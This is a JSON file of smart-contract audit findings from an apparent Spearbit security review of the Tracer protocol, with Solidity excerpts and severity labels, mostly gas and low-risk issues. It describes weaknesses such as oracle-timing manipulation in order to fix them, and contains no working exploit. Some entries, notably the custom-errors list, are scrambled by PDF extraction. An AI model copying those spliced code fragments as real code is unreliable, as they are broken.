storageArrayPlaceHolder.push(currentIntervalIds[i]); // entry for future intervals stays ,! in array } } delete unAggregatedCommitments[user]; unAggregatedCommitments[user] = storageArrayPlaceHolder; ... }", "labels": ["Spearbit", "Tracer", "Severity: Low Risk"]}, {"title": "Pool information might be lost if setFactory() of PoolKeeper contract is called", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The PoolKeeper contract has a function to change the factory: setFactory(). However, calling this function will make previous pools inaccessible for this PoolKeeper unless the new factory imports the pools from the old factory. The isUpkeepRequiredSinglePool() function calls factory.isValidPool(_pool), and it will fail because the new factory doesnt know about the old pools. As this call is essential for upkeeping, the entire upkeep mechanism will fail. function setFactory(address _factory) external override onlyOwner { factory = IPoolFactory(_factory); ... } function isUpkeepRequiredSinglePool(address _pool) public view override returns (bool) { if (!factory.isValidPool(_pool)) { // might not work if factory is changed return false; } ... }", "labels": ["Spearbit", "Tracer", "Severity: Low Risk"]}, {"title": "Ether could be lost when calling commit()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The commit() function sends the supplied ETH to makePaidClaimRequest() only if payForClaim == true. If the caller of commit() accidentally sends ETH when payForClaim == false then the ETH stays in the PoolCommitter contract and is effectively lost. Note: This was also documented in Secureums CARE Tracking function commit(...) external payable override checkInvariantsAfterFunction { ... if (payForClaim) { autoClaim.makePaidClaimRequest{value: msg.value}(msg.sender); } }", "labels": ["Spearbit", "Tracer", "Severity: Low Risk"]}, {"title": "Race condition if PoolFactory deploy pools before fees are set", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The deployPool function of PoolFactory contract can deploy pools before the changeInterval value and minting and burning fees are set. This means that fees would not be subtracted. The exact boundaries for the mintingFee, burningFee and changeInterval values arent clear. In some parts of the code < 1e18 is used, and in other parts <= 1e18. Furthermore, the initialize() function of the PoolCommitter contract doesnt check the value of changeInter- val. The setBurningFee(), setMintingFee() and setChangeInterval() functions of PoolCommitter contract dont check the new values. Finally, two representations of 1e18 are used: 1e18 and PoolSwapLibrary.WAD_PRECISION. contract PoolFactory is IPoolFactory, Ownable { function setMintAndBurnFeeAndChangeInterval(uint256 _mintingFee, uint256 _burningFee,...) ... { ... require(_mintingFee <= 1e18, \"Fee cannot be > 100%\"); require(_burningFee <= 1e18, \"Fee cannot be > 100%\"); require(_changeInterval <= 1e18, \"Change interval cannot be > 100%\"); mintingFee = _mintingFee; burningFee = _burningFee; changeInterval = _changeInterval; ... } function deployPool(PoolDeployment calldata deploymentParameters) external override returns (address) { ,! ... // no check that mintingFee, burningFee, changeInterval are set poolCommitter.initialize(..., mintingFee, burningFee, changeInterval, ...); } } 22 contract PoolCommitter is IPoolCommitter, Initializable { function initialize(... ,uint256 _mintingFee, uint256 _burningFee,... ) ... { ... require(_mintingFee < PoolSwapLibrary.WAD_PRECISION, \"Minting fee >= 100%\"); require(_burningFee < PoolSwapLibrary.WAD_PRECISION, \"Burning fee >= 100%\"); ... // no check on _changeInterval mintingFee = PoolSwapLibrary.convertUIntToDecimal(_mintingFee); burningFee = PoolSwapLibrary.convertUIntToDecimal(_burningFee); changeInterval = PoolSwapLibrary.convertUIntToDecimal(_changeInterval); ... } function setBurningFee(uint256 _burningFee) external override onlyGov { burningFee = PoolSwapLibrary.convertUIntToDecimal(_burningFee); // no check on _burningFee ... } function setMintingFee(uint256 _mintingFee) external override onlyGov { mintingFee = PoolSwapLibrary.convertUIntToDecimal(_mintingFee); // no check on _mintingFee ... } function setChangeInterval(uint256 _changeInterval) external override onlyGov { changeInterval = PoolSwapLibrary.convertUIntToDecimal(_changeInterval); // no check on ,! _changeInterval ... } function updateMintingFee(bytes16 longTokenPrice, bytes16 shortTokenPrice) private { ... if (PoolSwapLibrary.compareDecimals(mintingFee, MAX_MINTING_FEE) == 1) { // mintingFee is greater than 1 (100%). // We want to cap this at a theoretical max of 100% mintingFee = MAX_MINTING_FEE; // so mintingFee is allowed to be 1e18 } } }", "labels": ["Spearbit", "Tracer", "Severity: Low Risk"]}, {"title": "Committer not validated on withdraw claim and multi-paid claim", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "AutoClaim checks that the committer creating the claim request in makePaidClaimRequest and withdrawing the claim request in withdrawUserClaimRequest is a valid committer for the PoolFactory used in theAutoClaim initializer. The same security check should be done in all the other functions where the committer is passed as a function parameter.", "labels": ["Spearbit", "Tracer", "Severity: Low Risk"]}, {"title": "Some SMAOracle and AutoClaim state variables can be declared as immutable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "In the SMAOracle contract, the oracle, periods, observer, scaler and updateInterval state vari- ables are not declared as immutable. In the AutoClaim contract, the poolFactory state variable is not declared as immutable. Since the mentioned variables are only initialized in the contracts constructors, they can be declared as immutable in order to save gas.", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Use of counters can be optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "counter and i are both used as counters for the same loop. uint32 counter = 1; uint256 i = 0; ... while (i < upperBound) { ... unchecked { counter += 1; } i++; }", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "transferOwnership() function is inaccessible", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The ERC20_Cloneable contract contains a transferOwnership() function that may only be called by the owner, which is PoolFactory. However PoolFactory doesnt call the function so it is essentially dead code, making the deployment cost unnecessary additional gas. function transferOwnership(address _owner) external onlyOwner { require(_owner != address(0), \"Owner: setting to 0 address\"); owner = _owner; }", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Use cached values when present", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The updateAggregateBalance() function creates a temporary variable id with the value currentIn- Immediately after that, currentIntervalIds[i] is used again. This could be replaced by id to tervalIds[i]. save gas. function updateAggregateBalance(address user) public override checkInvariantsAfterFunction { ... for (uint256 i = 0; i < unAggregatedLength; i++) { uint256 id = currentIntervalIds[i]; if (currentIntervalIds[i] == 0) { // could use id continue; }", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "_invariantCheckContract stored twice", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Both the PoolCommitter and LeveragedPool contracts store the value of _invariantCheckContract twice, both in invariantCheckContract and invariantCheck. This is not necessary and costs extra gas. contract PoolCommitter is IPoolCommitter, Initializable { ... address public invariantCheckContract; IInvariantCheck public invariantCheck; ... function initialize( ..., address _invariantCheckContract, ... ) external override initializer { ... invariantCheckContract = _invariantCheckContract; invariantCheck = IInvariantCheck(_invariantCheckContract); ... } } contract LeveragedPool is ILeveragedPool, Initializable, IPausable { ... address public invariantCheckContract; IInvariantCheck public invariantCheck; ... function initialize(ILeveragedPool.Initialization calldata initialization) external override initializer { ,! ... invariantCheckContract = initialization._invariantCheckContract; invariantCheck = IInvariantCheck(initialization._invariantCheckContract); } }", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Unnecessary if/else statement in LeveragedPool", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "A boolean variable is used to indicate the type of token to mint. The if/else statement can be avoided by using LONG_INDEX or SHORT_INDEX as the parameter instead of a bool to indicate the use of long or short token. uint256 public constant LONG_INDEX = 0; uint256 public constant SHORT_INDEX = 1; ... function mintTokens(bool isLongToken,...){ if (isLongToken) { IPoolToken(tokens[LONG_INDEX]).mint(...); } else { IPoolToken(tokens[SHORT_INDEX]).mint(...); ...", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Uncached array length used in loop", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The users array length is used in a for loop condition, therefore the length of the array is evaluated in every loop iteration. Evaluating it once and caching it can save gas. for (uint256 i; i < users.length; i++) { ... }", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Unnecessary deletion of array elements in a loop is expensive", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The unAggregatedCommitments[user] array is deleted after the for loop in updateAggregateBal- ance. Therefore, deleting the array elements one by one with delete unAggregatedCommitments[user][i]; in the loop body costs unnecessary gas.", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Zero-value transfers are allowed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Given that claim() can return 0 when the claim isnt valid yet due to updateInterval, the return value should be checked to avoid doing an unnecessary sendValue() call with amount 0. Address.sendValue( payable(msg.sender), claim(user, poolCommitterAddress, poolCommitter, currentUpdateIntervalId) );", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Unneeded onlyUnpaused modifier in setQuoteAndPool()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The setQuoteAndPool() function is only callable once, from the factory contract during deployment, due to the onlyFactory modifier. During this call, the contract is always unpaused, therefore the onlyUnpaused modifier is not necessary.", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Unnecessary mapping access in AutoClaim.makePaidClaimRequest()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Resolving mappings consumes more gas than directly accessing the storage struct, therefore its more gas-efficient to use the already de-referenced variable than to resolve the mapping again. function makePaidClaimRequest(address user) external payable override onlyPoolCommitter { ClaimRequest storage request = claimRequests[user][msg.sender]; ... uint256 reward = claimRequests[user][msg.sender].reward; ... claimRequests[user][msg.sender].updateIntervalId = requestUpdateIntervalId; claimRequests[user][msg.sender].reward = msg.value;", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Function complexity can be reduced from linear to constant by rewriting loops", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The add() function of the PriceObserver contract shifts an entire array if the buffer is full, and the SMA() function of the SMAOracle contract sums the values of an array to calculate its average. Both of these functions have O(n) complexity and could be rewritten to have O(1) complexity. This would save gas and possibly increase the buffer size. 31 contract PriceObserver is Ownable, IPriceObserver { ... * @dev If the backing array is full (i.e., `length() == capacity()`, then * it is rotated such that the oldest price observation is deleted function add(int256 x) external override onlyWriter returns (bool) { ... if (full()) { leftRotateWithPad(x); ... } function leftRotateWithPad(int256 x) private { uint256 n = length(); /* linear scan over the [1, n] subsequence */ for (uint256 i = 1; i < n; i++) { observations[i - 1] = observations[i]; } ... } contract SMAOracle is IOracleWrapper { * @dev O(k) complexity due to linear traversal of the final `k` elements of `xs` ... function SMA(int256[24] memory xs, uint256 n, uint256 k) public pure returns (int256) { ... /* linear scan over the [n - k, n] subsequence */ for (uint256 i = n - k; i < n; i++) { S += xs[i]; } ... } }", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Unused observer state variable in PoolKeeper", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "There is no use for the observer state variable. It is only used in performUpkeepSinglePool in a require statement to check if is set. address public observer; function setPriceObserver(address _observer) external onlyOwner { ... observer = _observer; ... function performUpkeepSinglePool(...) require(observer != address(0), \"Observer not initialized\"); ...", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Usage of temporary variable instead of type casting in PoolKeeper.performUpkeepSinglePool()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The pool temporary variable is used to cast the address to ILeveragedPool. Casting the address directly where the pool variable is used saves gas, as _pool is calldata.", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Events and event emissions can be optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "PoolFactory.deployPool() would result in: Having a single DeployCommitter event to be emitted after setQuoteAndPool() in 1. Having better UX/event tracking and alignment with the current behavior to emit events during the Factory deployment. 2. Removing the QuoteAndPoolChanged event that is emitted only once during the lifetime of the PoolCommitter during PoolFactory.deployPool(). 3. Removing the ChangeIntervalSet emission in PoolCommitter.initialize(). The changeInterval has not really changed, it was initialized. This can be tracked by the DeployCommitter event.", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Multi-paid claim rewards should be sent only if nonzero", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "In both multiPaidClaimMultiplePoolCommitters() and multiPaidClaimSinglePoolCommitter(), there could be cases where the reward sent back to the claimer is zero. In these scenarios, the reward value should be checked to avoid wasting gas.", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Unnecessary quad arithmetic use where integer arithmetic works", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The ABDKMathQuad library is used to compute a division which is then truncated with toUint(). Semantically this is equivalent to a standard uint division, which is more gas efficient. The same library is also unnecessarily used to compute keepers reward. This can be safely done by using standard uint computation. function appropriateUpdateIntervalId(...) ... uint256 factorDifference = ABDKMathQuad.toUInt(divUInt(frontRunningInterval, updateInterval)); function keeperReward(...) ... int256 wadRewardValue = ABDKMathQuad.toInt( ABDKMathQuad.add( ABDKMathQuad.fromUInt(_keeperGas), ABDKMathQuad.div( ( ABDKMathQuad.div( (ABDKMathQuad.mul(ABDKMathQuad.fromUInt(_keeperGas), _tipPercent)), ABDKMathQuad.fromUInt(100) ) ), FIXED_POINT ) ) ); uint256 decimals = IERC20DecimalsWrapper(ILeveragedPool(_pool).quoteToken()).decimals(); uint256 deWadifiedReward = PoolSwapLibrary.fromWad(uint256(wadRewardValue), decimals);", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Custom errors should be used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "In the latest Solidity versions it is possible to replace the strings used to encode error messages with custom errors, which are more gas efficient. AutoClaim.sol: PoolCommitter\"); ,! AutoClaim.sol: AutoClaim.sol: PoolCommitter\"); ,! AutoClaim.sol: require(poolFactory.isValidPoolCommitter(msg.sender), \"msg.sender not valid require(_poolFactoryAddress != address(0), \"PoolFactory address == 0\"); require(poolFactory.isValidPoolCommitter(poolCommitterAddress), \"Invalid require(users.length == poolCommitterAddresses.length, \"Supplied arrays must be same length\"); ,! ChainlinkOracleWrapper.sol: require(_oracle != address(0), \"Oracle cannot be 0 address\"); ChainlinkOracleWrapper.sol: require(_deployer != address(0), \"Deployer cannot be 0 address\"); ChainlinkOracleWrapper.sol: require(_decimals <= MAX_DECIMALS, \"COA: too many decimals\"); ChainlinkOracleWrapper.sol: require(answeredInRound >= roundID, \"COA: Stale answer\"); ChainlinkOracleWrapper.sol: require(timeStamp != 0, \"COA: Round incomplete\"); ERC20_Cloneable.sol: ERC20_Cloneable.sol: InvariantCheck.sol: InvariantCheck.sol: LeveragedPool.sol: require(msg.sender == owner, \"msg.sender not owner\"); require(_owner != address(0), \"Owner: setting to 0 address\"); require(_factory != address(0), \"Factory address cannot be null\"); require(poolFactory.isValidPool(poolToCheck), \"Pool is invalid\"); require(!paused, \"Pool is paused\"); 36 LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: require(!paused, \"Pool is paused\"); require(!paused, \"Pool is paused\"); require(msg.sender == keeper, \"msg.sender not keeper\"); require(msg.sender == invariantCheckContract, \"msg.sender not invariantCheckContract\"); ,! LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: address\"); ,! LeveragedPool.sol: address\"); ,! LeveragedPool.sol: be 0 address\"); ,! LeveragedPool.sol: cannot be 0 address\"); ,! LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: address\"); ,! LeveragedPool.sol: address\"); ,! LeveragedPool.sol: be 0 address\"); ,! LeveragedPool.sol: require(msg.sender == poolCommitter, \"msg.sender not poolCommitter\"); require(msg.sender == governance, \"msg.sender not governance\"); require(initialization._feeAddress != address(0), \"Fee address cannot be 0 require(initialization._quoteToken != address(0), \"Quote token cannot be 0 require(initialization._oracleWrapper != address(0), \"Oracle wrapper cannot require(initialization._settlementEthOracle != address(0), \"Keeper oracle require(initialization._owner != address(0), \"Owner cannot be 0 address\"); require(initialization._keeper != address(0), \"Keeper cannot be 0 address\"); require(initialization._longToken != address(0), \"Long token cannot be 0 require(initialization._shortToken != address(0), \"Short token cannot be 0 require(initialization._poolCommitter != address(0), \"PoolCommitter cannot require(initialization._invariantCheckContract != address(0), \"InvariantCheck cannot be 0 address\"); require(initialization._fee < PoolSwapLibrary.WAD_PRECISION, \"Fee >= 100%\"); require(initialization._secondaryFeeSplitPercent <= 100, \"Secondary fee split cannot exceed 100%\"); as old governance address\"); ,! LeveragedPool.sol: LeveragedPool.sol: ,! LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: ,! LeveragedPool.sol: address\"); ,! LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: ,! PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: ,! PoolCommitter.sol: PoolCommitter.sol: invariantCheckContract\"); require(initialization._updateInterval != 0, \"Update interval cannot be 0\"); require(intervalPassed(), \"Update interval hasn't passed\"); require(account != address(0), \"Account cannot be 0 address\"); require(msg.sender == _oldSecondaryFeeAddress); require(_keeper != address(0), \"Keeper address cannot be 0 address\"); require(_governance != governance, \"New governance address cannot be same require(_governance != address(0), \"Governance address cannot be 0 require(governanceTransferInProgress, \"No governance change active\"); require(msg.sender == _provisionalGovernance, \"Not provisional governor\"); require(paused, \"Pool is live\"); require(!paused, \"Pool is paused\"); require(msg.sender == governance, \"msg.sender not governance\"); require(!paused, \"Pool is paused\"); require(!paused, \"Pool is paused\"); require(!paused, \"Pool is paused\"); require(msg.sender == invariantCheckContract, \"msg.sender not require(msg.sender == factory, \"Committer: not factory\"); require(msg.sender == leveragedPool, \"msg.sender not leveragedPool\"); require(msg.sender == user || msg.sender == address(autoClaim), \"msg.sender not committer or AutoClaim\"); require(_factory != address(0), \"Factory address cannot be 0 address\"); require(_invariantCheckContract != address(0), \"InvariantCheck address cannot be 0 address\"); ,! PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: require(_autoClaim != address(0), \"AutoClaim address cannot be null\"); require(_mintingFee < PoolSwapLibrary.WAD_PRECISION, \"Minting fee >= 100%\"); require(_burningFee < PoolSwapLibrary.WAD_PRECISION, \"Burning fee >= 100%\"); require(userCommit.balanceLongBurnAmount <= balance.longTokens, \"Insufficient pool tokens\"); ,! PoolCommitter.sol: require(userCommit.balanceShortBurnAmount <= balance.shortTokens, ,! \"Insufficient pool tokens\"); 37 ,! PoolCommitter.sol: PoolCommitter.sol: address\"); ,! PoolCommitter.sol: address\"); ,! PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: ,! PoolFactory.sol: ,! PoolFactory.sol: ,! PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolKeeper.sol: PoolKeeper.sol: PoolKeeper.sol: PoolKeeper.sol: PoolKeeper.sol: PoolSwapLibrary.sol: PoolSwapLibrary.sol: PoolSwapLibrary.sol: PoolSwapLibrary.sol: PriceObserver.sol: PriceObserver.sol: PriceObserver.sol: SMAOracle.sol: ,! SMAOracle.sol: PoolCommitter.sol: require(userCommit.balanceLongBurnMintAmount <= balance.longTokens, \"Insufficient pool tokens\"); ,! PoolCommitter.sol: require(userCommit.balanceShortBurnMintAmount <= balance.shortTokens, \"Insufficient pool tokens\"); require(amount > 0, \"Amount must not be zero\"); require(_quoteToken != address(0), \"Quote token address cannot be 0 require(_leveragedPool != address(0), \"Leveraged pool address cannot be 0 require(_feeReceiver != address(0), \"Address cannot be null\"); require(_poolKeeper != address(0), \"PoolKeeper not set\"); require(autoClaim != address(0), \"AutoClaim not set\"); require(invariantCheck != address(0), \"InvariantCheck not set\"); require(IOracleWrapper(deploymentParameters.oracleWrapper).deployer() == msg.sender,\"Deployer must be oracle wrapper owner\"); require(deploymentParameters.leverageAmount >= 1 && deploymentParameters.leverageAmount <= maxLeverage,\"PoolKeeper: leveraged amount invalid\"); require(IERC20DecimalsWrapper(deploymentParameters.quoteToken).decimals() <= MAX_DECIMALS,\"Decimal precision too high\"); require(_poolKeeper != address(0), \"address cannot be null\"); require(_invariantCheck != address(0), \"address cannot be null\"); require(_autoClaim != address(0), \"address cannot be null\"); require(newMaxLeverage > 0, \"Maximum leverage must be non-zero\"); require(_feeReceiver != address(0), \"address cannot be null\"); require(newFeePercent <= 100, \"Secondary fee split cannot exceed 100%\"); require(_fee <= 0.1e18, \"Fee cannot be > 10%\"); require(_mintingFee <= 1e18, \"Fee cannot be > 100%\"); require(_burningFee <= 1e18, \"Fee cannot be > 100%\"); require(_changeInterval <= 1e18, \"Change interval cannot be > 100%\"); require(msg.sender == address(factory), \"Caller not factory\"); require(_factory != address(0), \"Factory cannot be 0 address\"); require(_observer != address(0), \"Price observer cannot be 0 address\"); require(firstPrice > 0, \"First price is non-positive\"); require(observer != address(0), \"Observer not initialized\"); require(timestamp >= lastPriceTimestamp, \"timestamp in the past\"); require(price != 0, \"price == 0\"); require(price != 0, \"price == 0\"); require(price != 0, \"price == 0\"); require(msg.sender == writer, \"PO: Permission denied\"); require(i < length(), \"PO: Out of bounds\"); require(_writer != address(0), \"PO: Null address not allowed\"); require(_spotOracle != address(0) && _observer != address(0) && _deployer require(_periods > 0 && _periods <= IPriceObserver(_observer).capacity(), require(_spotDecimals <= MAX_DECIMALS, \"SMA: Decimal precision too high\"); require(_updateInterval != 0, \"Update interval cannot be 0\"); require(block.timestamp >= lastUpdate + updateInterval, \"SMA: Too early to require(k > 0 && k <= n && k <= uint256(type(int256).max), \"SMA: Out of != address(0),\"SMA: Null address forbidden\"); \"SMA: Out of bounds\"); ,! SMAOracle.sol: SMAOracle.sol: SMAOracle.sol: update\"); ,! SMAOracle.sol: ,! bounds\");", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Different updateIntervals in SMAOracle and pools", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The updateIntervals for the pools and the SMAOracles are different. If the updateInterval for SMAOracle is larger than the updateInterval for poolUpkeep(), then the oracle price update could happen directly after the poolUpkeep(). It is possible to perform permissionless calls to poll(). In combination with a delayed poolUpkeep() an attacker could manipulate the timing of the SMAOracle price, because after a call to poll() it cant be called again until updateInterval has passed. contract LeveragedPool is ILeveragedPool, Initializable, IPausable { function initialize(ILeveragedPool.Initialization calldata initialization) external override initializer { ,! ... updateInterval = initialization._updateInterval; ... } function poolUpkeep(... ) external override onlyKeeper { require(intervalPassed(), \"Update interval hasn't passed\"); ... } function intervalPassed() public view override returns (bool) { unchecked { return block.timestamp >= lastPriceTimestamp + updateInterval; } } contract SMAOracle is IOracleWrapper { constructor(..., uint256 _updateInterval, ... ) { updateInterval = _updateInterval; } function poll() external override returns (int256) { require(block.timestamp >= lastUpdate + updateInterval, \"SMA: Too early to update\"); return update(); } }", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "Tight coupling between LeveragedPool and PoolCommitter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The LeveragedPool and PoolCommitter contracts call each other back and forth. This could be optimized to make the code clearer and perhaps save some gas. Here is an example: contract LeveragedPool is ILeveragedPool, Initializable, IPausable { function poolUpkeep(...) external override onlyKeeper { ... IPoolCommitter(poolCommitter).executeCommitments(_boundedIntervals, _numberOfIntervals); ... } } contract PoolCommitter is IPoolCommitter, Initializable { function executeCommitments(...) external override onlyPool { ... uint256 lastPriceTimestamp = pool.lastPriceTimestamp(); uint256 updateInterval = pool.updateInterval(); ... } } // call to first contract // call to first contract", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "Code in SMA() is hard to read", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The SMA() function checks for k being smaller or equal to uint256(type(int256).max), a value somewhat difficult to read. Additionally, the number 24 is hardcoded. Note: This issue was also mentioned in Runtime Verification report: B15 PriceObserver - avoid magic values function SMA( int256[24] memory xs, uint256 n, uint256 k) public pure returns (int256) { ... require(k > 0 && k <= n && k <= uint256(type(int256).max), \"SMA: Out of bounds\"); ... for (uint256 i = n - k; i < n; i++) { S += xs[i]; } ... }", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "Code is chain-dependant due to fixed block time and no support for EIP-1559", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The PoolKeeper contract has several hardcoded assumptions about the chain on which it will be deployed. It has no support for EIP-1559 and doesnt use block.basefee. On Ethereum Mainnet the blocktime will change to 12 seconds with the ETH2 merge. The Secureum CARE-X report also has an entire discussion about other chains. contract PoolKeeper is IPoolKeeper, Ownable { ... uint256 public constant BLOCK_TIME = 13; /* in seconds */ ... /// Captures fixed gas overhead for performing upkeep that's unreachable /// by `gasleft()` due to our approach to error handling in that code uint256 public constant FIXED_GAS_OVERHEAD = 80195; ... }", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "ABDKQuad-related constants defined outside PoolSwapLibrary", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Some ABDKQuad-related constants are defined outside of the PoolSwapLibrary while others are shadowing the ones defined inside the library. As all ABDKQuad-related logic is contained in the library its less error prone to have any ABDKQuad-related definitions in the same file. The constant one is lowercase, while usually constants are uppercase. contract PoolCommitter is IPoolCommitter, Initializable { bytes16 public constant one = 0x3fff0000000000000000000000000000; ... // Set max minting fee to 100%. This is a ABDKQuad representation of 1 * 10 ** 18 bytes16 public constant MAX_MINTING_FEE = 0x403abc16d674ec800000000000000000; } library PoolSwapLibrary { /// ABDKMathQuad-formatted representation of the number one bytes16 public constant one = 0x3fff0000000000000000000000000000; }", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "Lack of a state to allow withdrawal of tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Immediately after the invariants dont hold and the pool has been paused, Governance can withdraw the collateral (quote). It might be prudent to create a separate state besides paused, such that unpause actions cant happen anymore to indicate withdrawal intention. Note: the comment in withdrawQuote() is incorrect. Pool must be paused. /** ... * @dev Pool must not be paused // comment not accurate ... */ ... function withdrawQuote() external onlyGov { require(paused, \"Pool is live\"); IERC20 quoteERC = IERC20(quoteToken); uint256 balance = quoteERC.balanceOf(address(this)); IERC20(quoteToken).safeTransfer(msg.sender, balance); emit QuoteWithdrawn(msg.sender, balance); }", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "Undocumented frontrunning protection", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "PoolFactory deployPool() per(deploymentParameters.oracleWrapper).deployer() == msg.sender frontrunning the deployment transaction of the pool. function the In of contract, check the protects IOracleWrap- against This is because the poolCommitter, LeveragedPool and the pair tokens instances are deployed at a deterministic address, calculated from the values of leverageAmount, quoteToken and oracleWrapper. An attacker cannot frontrun the pool deployment because of the different msg.sender address, that causes the deployer() check to fail. Alternatively, the attacker will have a different oracleWrapper, resulting in a different pool. However, this is not obvious to a casual reader. function deployPool(PoolDeployment calldata deploymentParameters) external override returns (address) { ... require( IOracleWrapper(deploymentParameters.oracleWrapper).deployer() == msg.sender, \"Deployer must be oracle wrapper owner\" ); ... bytes32 uniquePoolHash = keccak256( abi.encode( deploymentParameters.leverageAmount, deploymentParameters.quoteToken, deploymentParameters.oracleWrapper ) ); PoolCommitter poolCommitter = PoolCommitter( Clones.cloneDeterministic(poolCommitterBaseAddress, uniquePoolHash) ); ... LeveragedPool pool = LeveragedPool(Clones.cloneDeterministic(poolBaseAddress, uniquePoolHash)); ... } function deployPairToken(... ) internal returns (address) { ... bytes32 uniqueTokenHash = keccak256( abi.encode( deploymentParameters.leverageAmount, deploymentParameters.quoteToken, deploymentParameters.oracleWrapper, direction ) ); PoolToken pairToken = PoolToken(Clones.cloneDeterministic(pairTokenBaseAddress, ,! uniqueTokenHash)); ... }", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "No event exists for users self-claiming commits", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "There is no event emitted when a user self-claims a previous commit for themselves, in contrast to claim() which does emit the PaidRequestExecution event.", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "Mixups of types and scaling factors", "html_url": 